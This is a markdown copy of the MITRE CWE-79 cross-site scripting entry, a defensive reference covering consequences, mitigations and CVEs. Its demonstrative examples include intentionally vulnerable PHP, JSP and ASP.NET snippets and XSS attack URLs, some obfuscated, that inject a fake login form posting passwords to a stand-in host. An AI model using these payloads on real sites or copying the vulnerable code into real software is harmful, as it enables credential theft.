---
secid: "secid:weakness/mitre.org/cwe@5.0#CWE-79"
cwe_id: "CWE-79"
entry_type: weakness
name: "Improper Neutralization of Input During Web Page Generation"
abstraction: Base
structure: Simple
status: Stable
mapping_usage: Allowed
cwe_version: "5.0"
cwe_release_date: "2026-10-28"
upstream: "https://cwe.mitre.org/data/definitions/79.html"
---

# CWE-79: Improper Neutralization of Input During Web Page Generation

## Description

The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.

![Diagram for CWE-79](https://cwe.mitre.org/data/images/CWE-79-Diagram.png)

## Alternate Terms

- **Cross-site Scripting** (Common-Name, Attack-Focused)
- **XSS** (Acronym): A common abbreviation/acronym for Cross-Site Scripting.
- **HTML Injection** (Attack-Focused): A general term for an attack that inserts HTML into a web page, often involving stored XSS, although the term may be used for other XSS variants
- **Reflected XSS / Non-Persistent XSS / Type 1 XSS**: Used when a server application reads data directly from the HTTP request and reflects it back in the HTTP response.
- **Stored XSS / Persistent XSS / Type 2 XSS**: Used when a server-side application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content.
- **DOM-Based XSS / Type 0 XSS**: Used when a client-side application performs the injection of XSS into the page by manipulating the Domain Object Model (DOM).
- **CSS** (Acronym, Legacy): In the early years after initial discovery of XSS, "CSS" was a commonly-used acronym. However, this would cause confusion with "Cascading Style Sheets," so usage of this acronym has declined significantly.

## Related Weaknesses

| Nature | Entry | View | Ordinal | Dimensions |
| --- | --- | --- | --- | --- |
| ChildOf | [CWE-74](../weaknesses/CWE-74.md) Improper Neutralization of Special Elements in Output Used by a Downstream Component (Class) | [CWE-1000](../views/CWE-1000.md) | Primary | Input-Type: Input; Technology: Web; Resource-Type: Page; Behavior-Type: Generation; Common-Name: Cross-site Scripting |
| ChildOf | [CWE-74](../weaknesses/CWE-74.md) Improper Neutralization of Special Elements in Output Used by a Downstream Component (Class) | [CWE-1003](../views/CWE-1003.md) | Primary |  |
| CanPrecede | [CWE-494](../weaknesses/CWE-494.md) Download of Code Without Integrity Check (Base) | [CWE-1000](../views/CWE-1000.md) |  |  |
| PeerOf | [CWE-352](../weaknesses/CWE-352.md) Cross-Site Request Forgery (Compound) | [CWE-1000](../views/CWE-1000.md) |  |  |

## Weakness Ordinalities

- **Resultant**

## Applicable Platforms

| Type | Name | Class | Prevalence |
| --- | --- | --- | --- |
| Language |  | Not Language-Specific | Undetermined |
| Language | Go |  | Undetermined |
| Technology | AI/ML |  | Undetermined |
| Technology |  | Web Based | Often |
| Technology | Web Server |  | Undetermined |

## Background Details

The Same Origin Policy states that browsers should limit the resources accessible to scripts running on a given web site, or "origin", to the resources associated with that web site on the client-side, and not the client-side resources of any other sites or "origins". The goal is to prevent one site from being able to modify or read the contents of an unrelated site. Since the World Wide Web involves interactions between many sites, this policy is important for browsers to enforce.

When referring to XSS, the Domain of a website is roughly equivalent to the resources associated with that website on the client-side of the connection. That is, the domain can be thought of as all resources the browser is storing for the user's interactions with this particular site.

## Modes Of Introduction

- **Implementation**: REALIZATION: This weakness is caused during implementation of an architectural security tactic.

## Likelihood Of Exploit

High

## Common Consequences

| Scope | Impact | Note |
| --- | --- | --- |
| Access Control<br>Confidentiality | Bypass Protection Mechanism<br>Read Application Data | The most common attack performed with cross-site scripting involves the disclosure of private information stored in user cookies, such as session information. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity on behalf of the victim to an attacker-controlled system (such as sending all site cookies to a given E-mail address). This could be especially dangerous to the site if the victim has administrator privileges to manage that site. This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also. |
| Integrity<br>Confidentiality<br>Availability | Execute Unauthorized Code or Commands | In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws, for example, "drive-by hacking." |
| Confidentiality<br>Integrity<br>Availability<br>Access Control | Execute Unauthorized Code or Commands<br>Bypass Protection Mechanism<br>Read Application Data | The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running "Active X" controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content. |

## Detection Methods

- **Method:** Automated Static Analysis

  Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible, especially when multiple components are involved.

  **Effectiveness:** Moderate

- **Method:** Black Box

  Use the XSS Cheat Sheet [REF-714] or automated test-generation tools to help launch a wide variety of attacks against your web application. The Cheat Sheet contains many subtle XSS variations that are specifically targeted against weak XSS defenses.

  **Effectiveness:** Moderate

  **Effectiveness Notes:** With Stored XSS, the indirection caused by the data store can make it more difficult to find the problem. The tester must first inject the XSS string into the data store, then find the appropriate application functionality in which the XSS string is sent to other users of the application. These are two distinct steps in which the activation of the XSS can take place minutes, hours, or days after the XSS was originally injected into the data store.

## Potential Mitigations

- **Phase:** Architecture and Design · **Strategy:** Libraries or Frameworks · **ID:** MIT-4

  Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid [REF-1482].

  Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.

- **Phase:** Implementation; Architecture and Design

  Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.

  For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.

  Parts of the same output document may require different encodings, which will vary depending on whether the output is in the:

  - HTML body
  - Element attributes (such as src="XYZ")
  - URIs
  - JavaScript sections
  - Cascading Style Sheets and style property

  etc. Note that HTML Entity Encoding is only appropriate for the HTML body.

  Consult the XSS Prevention Cheat Sheet [REF-724] for more details on the types of encoding and escaping that are needed.

- **Phase:** Architecture and Design; Implementation · **Strategy:** Attack Surface Reduction · **ID:** MIT-6

  Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.

  **Effectiveness:** Limited

  **Effectiveness Notes:** This technique has limited effectiveness, but can be helpful when it is possible to store client state and sensitive information on the server side instead of in cookies, headers, hidden form fields, etc.

- **Phase:** Architecture and Design · **ID:** MIT-15

  For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.

- **Phase:** Architecture and Design · **Strategy:** Parameterization · **ID:** MIT-27

  If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.

- **Phase:** Implementation · **Strategy:** Output Encoding · **ID:** MIT-30.1

  Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.

  The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.

- **Phase:** Implementation · **ID:** MIT-43

  With Struts, write all data from form beans with the bean's filter attribute set to true.

- **Phase:** Implementation · **Strategy:** Attack Surface Reduction · **ID:** MIT-31

  To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XmlHttpRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.

  **Effectiveness:** Defense in Depth

- **Phase:** Implementation · **Strategy:** Input Validation · **ID:** MIT-5

  Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.

  When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."

  Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

  When dynamically constructing web pages, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended.

  Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon ("&lt;3") would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the "&lt;" character, which would need to be escaped or otherwise handled. In this case, stripping the "&lt;" might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities.

  Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address.

  Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.

- **Phase:** Architecture and Design · **Strategy:** Enforcement by Conversion · **ID:** MIT-21

  When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.

- **Phase:** Operation · **Strategy:** Firewall · **ID:** MIT-29

  Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth [REF-1481].

  **Effectiveness:** Moderate

  **Effectiveness Notes:** An application firewall might not cover all possible input vectors. In addition, attack techniques might be available to bypass the protection mechanism, such as using malformed inputs that can still be processed by the component that receives those inputs. Depending on functionality, an application firewall might inadvertently reject or modify legitimate requests. Finally, some manual effort may be required for customization.

- **Phase:** Operation; Implementation · **Strategy:** Environment Hardening · **ID:** MIT-16

  When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.

## Demonstrative Examples

### Example 1

The following code displays a welcome message on a web page based on the HTTP GET username parameter (covers a Reflected XSS (Type 1) scenario).

*Example (Bad, PHP):*

```php
$username = $_GET['username'];
echo '<div class="header"> Welcome, ' . $username . '</div>';
```

Because the parameter can be arbitrary, the url of the page could be modified so $username contains scripting syntax, such as

*Example (Attack):*

```
http://trustedSite.example.com/welcome.php?username=<Script Language="Javascript">alert("You've been attacked!");</Script>
```

This results in a harmless alert dialog popping up. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers.

More realistically, the attacker can embed a fake login box on the page, tricking the user into sending the user's password to the attacker:

*Example (Attack):*

```
http://trustedSite.example.com/welcome.php?username=<div id="stealPassword">Please Login:<form name="input" action="http://attack.example.com/stealPassword.php" method="post">Username: <input type="text" name="username" /><br/>Password: <input type="password" name="password" /><br/><input type="submit" value="Login" /></form></div>
```

If a user clicks on this link then Welcome.php will generate the following HTML and send it to the user's browser:

*Example (Result):*

```
<div class="header"> Welcome, <div id="stealPassword"> Please Login:
    <form name="input" action="attack.example.com/stealPassword.php" method="post">
        Username: <input type="text" name="username" /><br/>
        Password: <input type="password" name="password" /><br/>
        <input type="submit" value="Login" />
    </form>
</div></div>
```

The trustworthy domain of the URL may falsely assure the user that it is OK to follow the link. However, an astute user may notice the suspicious text appended to the URL. An attacker may further obfuscate the URL (the following example links are broken into multiple lines for readability):

*Example (Attack):*

```
trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22
stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input
%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php
%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text
%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A
+%3Cinput+type%3D%22password%22+name%3D%22password%22
+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22
+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A
```

The same attack string could also be obfuscated as:

*Example (Attack):*

```
trustedSite.example.com/welcome.php?username=<script+type="text/javascript">
document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073
\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064
\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067
\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D
\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063
\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F
\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D
\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061
\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068
\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070
\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D
\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079
\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061
\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065
\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073
\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075
\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073
\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022
\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E
\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D
\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C
\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F
\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');</script>
```

Both of these attack links will result in the fake login box appearing on the page, and users are more likely to ignore indecipherable text at the end of URLs.

### Example 2

The following code displays a Reflected XSS (Type 1) scenario.

The following JSP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.

*Example (Bad, JSP):*

```jsp
<% String eid = request.getParameter("eid"); %>
...
Employee ID: <%= eid %>
```

The following ASP.NET code segment reads an employee ID number from an HTTP request and displays it to the user.

*Example (Bad, ASP.NET):*

```asp.net
<%
protected System.Web.UI.WebControls.TextBox Login;
protected System.Web.UI.WebControls.Label EmployeeID;
...
EmployeeID.Text = Login.Text;
%>

<p><asp:label id="EmployeeID" runat="server" /></p>
```

The code in this example operates correctly if the Employee ID variable contains only standard alphanumeric text. If it has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response.

### Example 3

The following code displays a Stored XSS (Type 2) scenario.

The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.

*Example (Bad, JSP):*

```jsp
<%Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery("select * from emp where id="+eid);
if (rs != null) {
    rs.next();
    String name = rs.getString("name");
}%>

Employee Name: <%= name %>
```

The following ASP.NET code segment queries a database for an employee with a given employee ID and prints the name corresponding with the ID.

*Example (Bad, ASP.NET):*

```asp.net
<%
protected System.Web.UI.WebControls.Label EmployeeName;
...
string query = "select * from emp where id=" + eid;
sda = new SqlDataAdapter(query, conn);
sda.Fill(dt);
string name = dt.Rows[0]["Name"];
...
EmployeeName.Text = name;%>
<p><asp:label id="EmployeeName" runat="server" /></p>
```

This code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser.

### Example 4

The following code consists of two separate pages in a web application, one devoted to creating user accounts and another devoted to listing active users currently logged in. It also displays a Stored XSS (Type 2) scenario.

CreateUser.php

*Example (Bad, PHP):*

```php
$username = mysql_real_escape_string($username);
$fullName = mysql_real_escape_string($fullName);
$query = sprintf('Insert Into users (username,password) Values ("%s","%s","%s")', $username, crypt($password),$fullName) ;
mysql_query($query);
/.../
```

The code is careful to avoid a SQL injection attack (CWE-89) but does not stop valid HTML from being stored in the database. This can be exploited later when ListUsers.php retrieves the information:

ListUsers.php

*Example (Bad, PHP):*

```php
$query = 'Select * From users Where loggedIn=true';
$results = mysql_query($query);

if (!$results) {
    exit;
}

//Print list of users to page
echo '<div id="userlist">Currently Active Users:';
while ($row = mysql_fetch_assoc($results)) {
    echo '<div class="userNames">'.$row['fullname'].'</div>';
}
echo '</div>';
```

The attacker can set their name to be arbitrary HTML, which will then be displayed to all visitors of the Active Users page. This HTML can, for example, be a password stealing Login message.

### Example 5

The following code is a simplistic message board that saves messages in HTML format and appends them to a file. When a new user arrives in the room, it makes an announcement:

*Example (Bad, PHP):*

```php
$name = $_COOKIE["myname"];
$announceStr = "$name just logged in.";

//save HTML-formatted message to file; implementation details are irrelevant for this example.
saveMessage($announceStr);
```

An attacker may be able to perform an HTML injection (Type 2 XSS) attack by setting a cookie to a value like:

*Example (Attack):*

```
<script>document.alert('Hacked');</script>
```

The raw contents of the message file would look like:

*Example (Result):*

```
<script>document.alert('Hacked');</script> has logged in.
```

For each person who visits the message page, their browser would execute the script, generating a pop-up window that says "Hacked". More malicious attacks are possible; see the rest of this entry.

### Example 6 (DX-226)

The following code attempts to stop XSS attacks by removing all occurrences of "script" in an input string.

*Example (Bad, Java):*

```java
public String removeScriptTags(String input, String mask) {
    return input.replaceAll("script", mask);
}
```

Because the code only checks for the lower-case "script" string, it can be easily defeated with upper-case script tags.

## Observed Examples

| Reference | Description |
| --- | --- |
| [CVE-2024-49038](https://www.cve.org/CVERecord?id=CVE-2024-49038) | XSS in AI assistant |
| [CVE-2024-54142](https://www.cve.org/CVERecord?id=CVE-2024-54142) | Plugin that enables AI features allows input with html entities, leading to XSS |
| [CVE-2021-25926](https://www.cve.org/CVERecord?id=CVE-2021-25926) | Python Library Manager did not sufficiently neutralize a user-supplied search term, allowing reflected XSS. |
| [CVE-2021-25963](https://www.cve.org/CVERecord?id=CVE-2021-25963) | Python-based e-commerce platform did not escape returned content on error pages, allowing for reflected Cross-Site Scripting attacks. |
| [CVE-2021-1879](https://www.cve.org/CVERecord?id=CVE-2021-1879) | Universal XSS in mobile operating system, as exploited in the wild per CISA KEV. |
| [CVE-2020-3580](https://www.cve.org/CVERecord?id=CVE-2020-3580) | Chain: improper input validation (CWE-20) in firewall product leads to XSS (CWE-79), as exploited in the wild per CISA KEV. |
| [CVE-2014-8958](https://www.cve.org/CVERecord?id=CVE-2014-8958) | Admin GUI allows XSS through cookie. |
| [CVE-2017-9764](https://www.cve.org/CVERecord?id=CVE-2017-9764) | Web stats program allows XSS through crafted HTTP header. |
| [CVE-2014-5198](https://www.cve.org/CVERecord?id=CVE-2014-5198) | Web log analysis product allows XSS through crafted HTTP Referer header. |
| [CVE-2008-5080](https://www.cve.org/CVERecord?id=CVE-2008-5080) | Chain: protection mechanism failure allows XSS |
| [CVE-2006-4308](https://www.cve.org/CVERecord?id=CVE-2006-4308) | Chain: incomplete denylist (CWE-184) only checks "javascript:" tag, allowing XSS (CWE-79) using other tags |
| [CVE-2007-5727](https://www.cve.org/CVERecord?id=CVE-2007-5727) | Chain: incomplete denylist (CWE-184) only removes SCRIPT tags, enabling XSS (CWE-79) |
| [CVE-2008-5770](https://www.cve.org/CVERecord?id=CVE-2008-5770) | Reflected XSS using the PATH_INFO in a URL |
| [CVE-2008-4730](https://www.cve.org/CVERecord?id=CVE-2008-4730) | Reflected XSS not properly handled when generating an error message |
| [CVE-2008-5734](https://www.cve.org/CVERecord?id=CVE-2008-5734) | Reflected XSS sent through email message. |
| [CVE-2008-0971](https://www.cve.org/CVERecord?id=CVE-2008-0971) | Stored XSS in a security product. |
| [CVE-2008-5249](https://www.cve.org/CVERecord?id=CVE-2008-5249) | Stored XSS using a wiki page. |
| [CVE-2006-3568](https://www.cve.org/CVERecord?id=CVE-2006-3568) | Stored XSS in a guestbook application. |
| [CVE-2006-3211](https://www.cve.org/CVERecord?id=CVE-2006-3211) | Stored XSS in a guestbook application using a javascript: URI in a bbcode img tag. |
| [CVE-2006-3295](https://www.cve.org/CVERecord?id=CVE-2006-3295) | Chain: library file is not protected against a direct request (CWE-425), leading to reflected XSS (CWE-79). |

## Dimensions

- **Behavior-Property:** Improper
- **Behavior-Type:** Neutralization
- **Input-Type:** Input
- **Technology:** Web
- **Resource-Type:** Page
- **Behavior-Type:** Generation
- **Common-Name:** Cross-site Scripting

## Technical Nuance

There are many variants of cross-site scripting, characterized by a variety of terms or involving different attack topologies. However, they all indicate the same fundamental weakness: improper neutralization of dangerous input between the adversary and a victim.

The attack methods for XSS can vary depending on the type of XSS and the attacker's goal.

- **Reflected XSS exploits (Type 1)** occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.
- In a **Stored XSS exploit (Type 2)**, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.
- **DOM-based XSS (Type 0)** generally involves server-controlled, trusted script that is sent to the client, such as JavaScript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.

## Taxonomy Mappings

| Taxonomy | Entry ID | Entry Name | Mapping Fit |
| --- | --- | --- | --- |
| PLOVER |  | Cross-site scripting (XSS) |  |
| 7 Pernicious Kingdoms |  | Cross-site Scripting |  |
| CLASP |  | Cross-site scripting |  |
| OWASP Top Ten 2007 | A1 | Cross Site Scripting (XSS) | Exact |
| OWASP Top Ten 2004 | A1 | Unvalidated Input | CWE More Specific |
| OWASP Top Ten 2004 | A4 | Cross-Site Scripting (XSS) Flaws | Exact |
| WASC | 8 | Cross-site Scripting |  |
| Software Fault Patterns | SFP24 | Tainted input to command |  |
| OMG ASCSM | ASCSM-CWE-79 |  |  |
| OWASP Golang Secure Coding Practices Guide |  | Output Encoding |  |

## Related Attack Patterns

- [CAPEC-209](https://capec.mitre.org/data/definitions/209.html)
- [CAPEC-588](https://capec.mitre.org/data/definitions/588.html)
- [CAPEC-591](https://capec.mitre.org/data/definitions/591.html)
- [CAPEC-592](https://capec.mitre.org/data/definitions/592.html)
- [CAPEC-63](https://capec.mitre.org/data/definitions/63.html)
- [CAPEC-85](https://capec.mitre.org/data/definitions/85.html)

## References

- [REF-709] Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager and Seth Fogie. "XSS Attacks". Syngress. 2007.
- [REF-44] Michael Howard, David LeBlanc and John Viega. "24 Deadly Sins of Software Security". "Sin 2: Web-Server Related Vulnerabilities (XSS, XSRF, and Response Splitting)." Page 31. McGraw-Hill. 2010.
- [REF-44] Michael Howard, David LeBlanc and John Viega. "24 Deadly Sins of Software Security". "Sin 3: Web-Client Related Vulnerabilities (XSS)." Page 63. McGraw-Hill. 2010.
- [REF-712] "Cross-site scripting". Wikipedia. 2008-08-26. <https://en.wikipedia.org/wiki/Cross-site_scripting> (URL validated: 2023-04-07).
- [REF-7] Michael Howard and David LeBlanc. "Writing Secure Code". Chapter 13, "Web-Specific Input Issues" Page 413. 2nd Edition. Microsoft Press. 2002-12-04. <https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223>.
- [REF-714] RSnake. "XSS (Cross Site Scripting) Cheat Sheet". <http://ha.ckers.org/xss.html>.
- [REF-715] Microsoft. "Mitigating Cross-site Scripting With HTTP-only Cookies". <https://learn.microsoft.com/en-us/previous-versions//ms533046(v=vs.85)?redirectedfrom=MSDN> (URL validated: 2023-04-07).
- [REF-716] Mark Curphey, Microsoft. "Anti-XSS 3.0 Beta and CAT.NET Community Technology Preview now Live!". <https://learn.microsoft.com/en-us/archive/blogs/cisg/anti-xss-3-0-beta-and-cat-net-community-technology-preview-now-live> (URL validated: 2023-04-07).
- [REF-45] OWASP. "OWASP Enterprise Security API (ESAPI) Project". <https://owasp.org/www-project-enterprise-security-api/> (URL validated: 2025-07-24).
- [REF-718] Ivan Ristic. "XSS Defense HOWTO". <https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/xss-defense-howto/> (URL validated: 2023-04-07).
- [REF-719] OWASP. "Web Application Firewall". <http://www.owasp.org/index.php/Web_Application_Firewall>.
- [REF-720] Web Application Security Consortium. "Web Application Firewall Evaluation Criteria". <http://projects.webappsec.org/w/page/13246985/Web%20Application%20Firewall%20Evaluation%20Criteria> (URL validated: 2023-04-07).
- [REF-721] RSnake. "Firefox Implements httpOnly And is Vulnerable to XMLHTTPRequest". 2007-07-19.
- [REF-722] "XMLHttpRequest allows reading HTTPOnly cookies". Mozilla. <https://bugzilla.mozilla.org/show_bug.cgi?id=380418>.
- [REF-723] "Apache Wicket". <http://wicket.apache.org/>.
- [REF-724] OWASP. "XSS (Cross Site Scripting) Prevention Cheat Sheet". <http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet>.
- [REF-725] OWASP. "DOM based XSS Prevention Cheat Sheet". <http://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet>.
- [REF-726] Jason Lam. "Top 25 series - Rank 1 - Cross Site Scripting". SANS Software Security Institute. 2010-02-22. <https://www.sans.org/blog/top-25-series-rank-1-cross-site-scripting/> (URL validated: 2023-04-07).
- [REF-62] Mark Dowd, John McDonald and Justin Schuh. "The Art of Software Security Assessment". Chapter 17, "Cross Site Scripting", Page 1071. 1st Edition. Addison Wesley. 2006.
- [REF-956] Wikipedia. "Samy (computer worm)". <https://en.wikipedia.org/wiki/Samy_(computer_worm)> (URL validated: 2018-01-16).
- [REF-962] Object Management Group (OMG). "Automated Source Code Security Measure (ASCSM)". ASCSM-CWE-79. 2016-01. <http://www.omg.org/spec/ASCSM/1.0/>.
- [REF-1481] D3FEND. "D3FEND: Application Layer Firewall". <https://d3fend.mitre.org/dao/artifact/d3f:ApplicationLayerFirewall/> (URL validated: 2025-09-06).
- [REF-1566] OWASP. "Golang Secure Coding Practices guide". Output Encoding, page 13. 2024. <https://github.com/OWASP/Go-SCP> (URL validated: 2026-10-19).
- [REF-1482] D3FEND. "D3FEND: D3-TL Trusted Library". <https://d3fend.mitre.org/technique/d3f:TrustedLibrary/> (URL validated: 2025-09-06).
- [REF-1534] OMG. "Automated Technical Debt Measure, Version 2". 2024-08. <https://www.omg.org/spec/ATDM2/1.0/PDF> (URL validated: 2026-07-16).

## Mapping Notes

- **Usage:** Allowed
- **Rationale:** This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.
- **Comments:** Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.
- **Reasons:** Acceptable-Use

## Notes

